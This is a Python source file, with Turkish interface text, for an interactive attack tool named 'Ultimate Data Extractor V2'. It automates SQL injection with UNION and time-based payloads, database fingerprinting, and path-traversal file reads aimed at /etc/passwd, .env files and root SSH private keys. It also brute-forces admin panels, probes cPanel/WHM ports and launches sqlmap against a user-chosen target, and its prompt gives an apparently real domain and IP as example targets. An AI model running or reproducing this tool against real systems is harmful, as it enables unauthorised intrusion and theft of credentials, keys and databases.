#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║      🛡️  ULTİMATE DATA EXTRACTOR V2  🛡️                  ║
║                                                               ║
║   Developer : BüyükXan | Developer Xan                      ║
║                                                               ║
║   SQLi + LFI + Admin + cPanel - Tek Araç                    ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝

Kullanım: python3 extractor.py
"""

import requests
import sys
import time
import re
import json
import os
import subprocess
from urllib.parse import urljoin, urlparse
from datetime import datetime

# Renkler
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class DataExtractor:
    def __init__(self):
        self.target = ""
        self.results = {
            'target': '',
            'timestamp': str(datetime.now()),
            'sql_injection': [],
            'lfi_rfi': [],
            'admin_panels': [],
            'cpanel_ports': [],
            'database': [],
            'tables': [],
            'users': [],
            'files': []
        }
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Payload'lar
        self.sql_payloads = [
            ("' OR '1'='1", "Temel SQLi"),
            ("' OR 1=1--", "SQLi Yorum"),
            ("' UNION SELECT NULL--", "Union 1"),
            ("' UNION SELECT NULL,NULL--", "Union 2"),
            ("' UNION SELECT NULL,NULL,NULL--", "Union 3"),
            ("' AND SLEEP(5)--", "Zaman Tabanlı"),
        ]
        
        self.lfi_payloads = [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../../../windows/win.ini",
            "../../../../boot.ini",
            "../../../../var/www/html/config.php",
            "../../../../var/www/html/.env",
            "../../../../root/.ssh/id_rsa",
        ]
        
        self.admin_dirs = [
            'admin', 'login', 'panel', 'cpanel', 'whm', 'webmail', 'cp',
            'dashboard', 'administrator', 'phpmyadmin', 'pma', 'mysql',
            'backup', 'tmp', 'test', 'dev', 'api', 'manager', 'control'
        ]
        
        self.ports = [80, 443, 8080, 8443, 2082, 2083, 2086, 2087, 2096, 22, 21, 3306]
    
    def print_banner(self):
        os.system('clear')
        banner = f"""
{Colors.RED}╔═══════════════════════════════════════════════════════════════╗
{Colors.RED}║                                                               ║
{Colors.RED}║     {Colors.YELLOW}🛡️  ULTİMATE DATA EXTRACTOR V2  🛡️{Colors.RED}              ║
{Colors.RED}║                                                               ║
{Colors.RED}║     {Colors.CYAN}Developer : BüyükXan | Developer Xan{Colors.RED}         ║
{Colors.RED}║                                                               ║
{Colors.RED}╚═══════════════════════════════════════════════════════════════╝{Colors.RESET}
        """
        print(banner)
    
    def print_menu(self):
        menu = f"""
{Colors.BOLD}{Colors.BLUE}╔════════════════════════════════════════════════════════╗
║                    ANA MENÜ                              ║
╠════════════════════════════════════════════════════════╣
║  {Colors.YELLOW}1{Colors.RESET}{Colors.BLUE}) Hedef Belirle                                  ║
║  {Colors.YELLOW}2{Colors.RESET}{Colors.BLUE}) SQL Injection - Veri Çek                      ║
║  {Colors.YELLOW}3{Colors.RESET}{Colors.BLUE}) LFI/RFI - Dosya Oku                          ║
║  {Colors.YELLOW}4{Colors.RESET}{Colors.BLUE}) Admin Panel Bulucu                           ║
║  {Colors.YELLOW}5{Colors.RESET}{Colors.BLUE}) cPanel/WHM Kontrol                           ║
║  {Colors.YELLOW}6{Colors.RESET}{Colors.BLUE}) Tümünü Yap (Full Extract)                    ║
║  {Colors.YELLOW}7{Colors.RESET}{Colors.BLUE}) Rapor Göster                                 ║
║  {Colors.YELLOW}8{Colors.RESET}{Colors.BLUE}) Raporu JSON Kaydet                           ║
║  {Colors.YELLOW}9{Colors.RESET}{Colors.BLUE}) SQLMap ile Otomatik (Yardımcı)              ║
║  {Colors.YELLOW}0{Colors.RESET}{Colors.BLUE}) Çıkış                                        ║
╚════════════════════════════════════════════════════════╝
{Colors.RESET}
        """
        print(menu)
    
    def set_target(self):
        print(f"\n{Colors.CYAN}[+] Hedef URL gir (örn: https://10000frogs.com veya 173.201.76.29):{Colors.RESET}")
        target = input("➜ ").strip()
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        self.target = target
        self.results['target'] = target
        print(f"{Colors.GREEN}✅ Hedef: {self.target}{Colors.RESET}\n")
    
    def sql_injection_extract(self):
        print(f"\n{Colors.CYAN}[+] SQL Injection - Veri Çekme Başlıyor...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Hedef: {self.target}{Colors.RESET}\n")
        
        params = ['id', 'page', 'user', 'file', 'cat', 'product', 'article', 'news', 'detail', 'q', 'search']
        found_data = []
        
        for param in params:
            for payload, desc in self.sql_payloads:
                test_url = f"{self.target}?{param}={payload}"
                try:
                    r = self.session.get(test_url, timeout=10)
                    
                    # SQL hata kontrolü
                    errors = ['sql', 'mysql', 'sqlite', 'postgresql', 'ora-', 'driver', 'syntax error', 
                             'warning', 'mysqli', 'PDO', 'SQLSTATE']
                    
                    if any(e in r.text.lower() for e in errors):
                        data = {
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'type': desc,
                            'response': r.text[:500]
                        }
                        found_data.append(data)
                        self.results['sql_injection'].append(data)
                        print(f"{Colors.GREEN}✅ SQLi Bulundu!{Colors.RESET}")
                        print(f"   URL: {test_url}")
                        print(f"   Payload: {payload}")
                        print(f"   {Colors.RED}Hata: {r.text[:100]}{Colors.RESET}\n")
                        
                        # Veritabanı bilgilerini çekmeye çalış
                        self.extract_db_info(param)
                        
                except Exception as e:
                    pass
        
        if not found_data:
            print(f"{Colors.RED}❌ SQL Injection bulunamadı.{Colors.RESET}\n")
        
        return found_data
    
    def extract_db_info(self, param):
        """Veritabanı bilgilerini çek"""
        print(f"{Colors.YELLOW}[*] Veritabanı bilgileri çekiliyor...{Colors.RESET}")
        
        queries = [
            ("database()", "Veritabanı Adı"),
            ("version()", "Versiyon"),
            ("user()", "Kullanıcı"),
            ("@@version", "MySQL Versiyon"),
            ("current_user()", "Current User"),
        ]
        
        for query, desc in queries:
            try:
                test_url = f"{self.target}?{param}=1' UNION SELECT {query}--"
                r = self.session.get(test_url, timeout=10)
                if len(r.text) > 50:
                    print(f"   {Colors.GREEN}✅ {desc}: {r.text[:100]}{Colors.RESET}")
                    self.results['database'].append({desc: r.text[:200]})
            except:
                pass
    
    def lfi_extract(self):
        print(f"\n{Colors.CYAN}[+] LFI/RFI - Dosya Okuma Başlıyor...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Hedef: {self.target}{Colors.RESET}\n")
        
        params = ['file', 'page', 'include', 'path', 'doc', 'folder', 'dir']
        found_files = []
        
        for param in params:
            for payload in self.lfi_payloads:
                test_url = f"{self.target}?{param}={payload}"
                try:
                    r = self.session.get(test_url, timeout=10)
                    
                    # LFI başarılı mı?
                    if 'root:' in r.text or '[extensions]' in r.text or 'boot loader' in r.text:
                        data = {
                            'url': test_url,
                            'param': param,
                            'payload': payload,
                            'content': r.text[:1000]
                        }
                        found_files.append(data)
                        self.results['lfi_rfi'].append(data)
                        self.results['files'].append({
                            'file': payload,
                            'content': r.text[:500]
                        })
                        
                        print(f"{Colors.GREEN}✅ LFI Başarılı!{Colors.RESET}")
                        print(f"   URL: {test_url}")
                        print(f"   Dosya: {payload}")
                        print(f"   {Colors.RED}İçerik: {r.text[:200]}{Colors.RESET}\n")
                        
                except Exception as e:
                    pass
        
        if not found_files:
            print(f"{Colors.RED}❌ LFI/RFI bulunamadı.{Colors.RESET}\n")
        
        return found_files
    
    def find_admin_panels(self):
        print(f"\n{Colors.CYAN}[+] Admin Panel Bulucu Başlıyor...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Hedef: {self.target}{Colors.RESET}\n")
        
        found = []
        for directory in self.admin_dirs:
            test_url = urljoin(self.target, directory + '/')
            try:
                r = self.session.get(test_url, timeout=5)
                if r.status_code == 200:
                    data = {
                        'url': test_url,
                        'status': r.status_code,
                        'size': len(r.text)
                    }
                    found.append(data)
                    self.results['admin_panels'].append(data)
                    print(f"{Colors.GREEN}✅ Panel: {test_url} (200){Colors.RESET}")
                elif r.status_code in [301, 302, 307, 308]:
                    print(f"{Colors.YELLOW}⚠️  Yönlendirme: {test_url} -> {r.headers.get('Location', '?')}{Colors.RESET}")
            except:
                pass
        
        if not found:
            print(f"{Colors.RED}❌ Admin paneli bulunamadı.{Colors.RESET}\n")
        
        return found
    
    def check_cpanel(self):
        print(f"\n{Colors.CYAN}[+] cPanel/WHM Kontrolü Başlıyor...{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Hedef: {self.target}{Colors.RESET}\n")
        
        host = self.target.replace('http://', '').replace('https://', '').split('/')[0]
        cpanel_ports = {
            2082: "cPanel (HTTP)",
            2083: "cPanel (HTTPS)",
            2086: "WHM (HTTP)",
            2087: "WHM (HTTPS)",
            2096: "Webmail (HTTPS)",
            2095: "Webmail (HTTP)"
        }
        
        found = []
        for port, name in cpanel_ports.items():
            try:
                url = f"https://{host}:{port}"
                r = requests.get(url, timeout=3, verify=False)
                if r.status_code == 200:
                    data = {'port': port, 'name': name, 'url': url, 'status': r.status_code}
                    found.append(data)
                    self.results['cpanel_ports'].append(data)
                    print(f"{Colors.GREEN}✅ {name}: {url} (200){Colors.RESET}")
                elif r.status_code in [401, 403]:
                    print(f"{Colors.YELLOW}⚠️  {name}: {url} ({r.status_code}) - Giriş gerekli{Colors.RESET}")
            except:
                pass
        
        if not found:
            print(f"{Colors.RED}❌ cPanel/WHM bulunamadı.{Colors.RESET}\n")
        
        return found
    
    def full_extract(self):
        print(f"\n{Colors.BOLD}{Colors.HEADER}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}         📡 FULL EXTRACT BAŞLATILIYOR 📡{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.HEADER}════════════════════════════════════════════════════════{Colors.RESET}\n")
        
        self.sql_injection_extract()
        time.sleep(1)
        self.lfi_extract()
        time.sleep(1)
        self.find_admin_panels()
        time.sleep(1)
        self.check_cpanel()
        
        print(f"\n{Colors.BOLD}{Colors.GREEN}════════════════════════════════════════════════════════{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}         ✅ FULL EXTRACT TAMAMLANDI!{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}════════════════════════════════════════════════════════{Colors.RESET}\n")
        
        self.show_report()
    
    def show_report(self):
        print(f"\n{Colors.BOLD}{Colors.BLUE}╔════════════════════════════════════════════════════════╗")
        print(f"║                    RAPOR                                  ║")
        print(f"╚════════════════════════════════════════════════════════╝{Colors.RESET}\n")
        
        print(f"{Colors.CYAN}[+] Hedef: {self.results['target']}{Colors.RESET}")
        print(f"{Colors.CYAN}[+] Zaman: {self.results['timestamp']}{Colors.RESET}\n")
        
        # SQLi
        sql_count = len(self.results['sql_injection'])
        print(f"{Colors.YELLOW}[*] SQL Injection: {sql_count} bulundu{Colors.RESET}")
        for item in self.results['sql_injection']:
            print(f"    - {item.get('url', '')}")
        
        # LFI
        lfi_count = len(self.results['lfi_rfi'])
        print(f"\n{Colors.YELLOW}[*] LFI/RFI: {lfi_count} bulundu{Colors.RESET}")
        for item in self.results['lfi_rfi']:
            print(f"    - {item.get('url', '')}")
        
        # Admin Panels
        admin_count = len(self.results['admin_panels'])
        print(f"\n{Colors.YELLOW}[*] Admin Paneller: {admin_count} bulundu{Colors.RESET}")
        for item in self.results['admin_panels']:
            print(f"    - {item.get('url', '')}")
        
        # cPanel
        cpanel_count = len(self.results['cpanel_ports'])
        print(f"\n{Colors.YELLOW}[*] cPanel/WHM: {cpanel_count} bulundu{Colors.RESET}")
        for item in self.results['cpanel_ports']:
            print(f"    - {item.get('name', '')}: {item.get('url', '')}")
        
        # Database
        if self.results['database']:
            print(f"\n{Colors.GREEN}[+] Veritabanı Bilgileri:{Colors.RESET}")
            for item in self.results['database']:
                for key, value in item.items():
                    print(f"    - {key}: {value[:100]}")
        
        print("\n" + "="*60)
    
    def save_report(self):
        filename = f"report_{int(time.time())}.json"
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n{Colors.GREEN}✅ Rapor kaydedildi: {filename}{Colors.RESET}")
    
    def sqlmap_auto(self):
        print(f"\n{Colors.CYAN}[+] SQLMap ile Otomatik Tarama{Colors.RESET}")
        print(f"{Colors.YELLOW}[*] Hedef: {self.target}{Colors.RESET}\n")
        
        host = self.target.replace('http://', '').replace('https://', '').split('/')[0]
        
        cmd = f"sqlmap -u '{self.target}?id=1' --host='{host}' --batch --dbs --random-agent --tamper=space2comment --level=3 --risk=2"
        
        print(f"{Colors.CYAN}[>] Çalıştırılacak komut:{Colors.RESET}")
        print(f"{Colors.YELLOW}{cmd}{Colors.RESET}\n")
        
        choice = input(f"{Colors.GREEN}SQLMap'i çalıştırsın mı? (y/n): {Colors.RESET}")
        if choice.lower() == 'y':
            os.system(cmd)
    
    def run(self):
        self.print_banner()
        
        while True:
            if not self.target:
                print(f"{Colors.RED}[!] Önce hedef belirleyin (Menü 1){Colors.RESET}\n")
            
            self.print_menu()
            choice = input(f"{Colors.BOLD}{Colors.CYAN}Seçiminiz (0-9): {Colors.RESET}").strip()
            
            if choice == '1':
                self.set_target()
            
            elif choice == '2':
                if not self.target:
                    self.set_target()
                self.sql_injection_extract()
            
            elif choice == '3':
                if not self.target:
                    self.set_target()
                self.lfi_extract()
            
            elif choice == '4':
                if not self.target:
                    self.set_target()
                self.find_admin_panels()
            
            elif choice == '5':
                if not self.target:
                    self.set_target()
                self.check_cpanel()
            
            elif choice == '6':
                if not self.target:
                    self.set_target()
                self.full_extract()
            
            elif choice == '7':
                self.show_report()
            
            elif choice == '8':
                self.save_report()
            
            elif choice == '9':
                if not self.target:
                    self.set_target()
                self.sqlmap_auto()
            
            elif choice == '0':
                print(f"{Colors.RED}[+] Çıkış yapılıyor...{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.CYAN}Developed by BüyükXan | Developer Xan{Colors.RESET}")
                break
            
            else:
                print(f"{Colors.RED}❌ Geçersiz seçim!{Colors.RESET}")
            
            input(f"\n{Colors.YELLOW}[*] Devam etmek için Enter tuşuna bas...{Colors.RESET}")

if __name__ == "__main__":
    try:
        tool = DataExtractor()
        tool.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[+] Kullanıcı tarafından durduruldu.{Colors.RESET}")
        sys.exit(0)
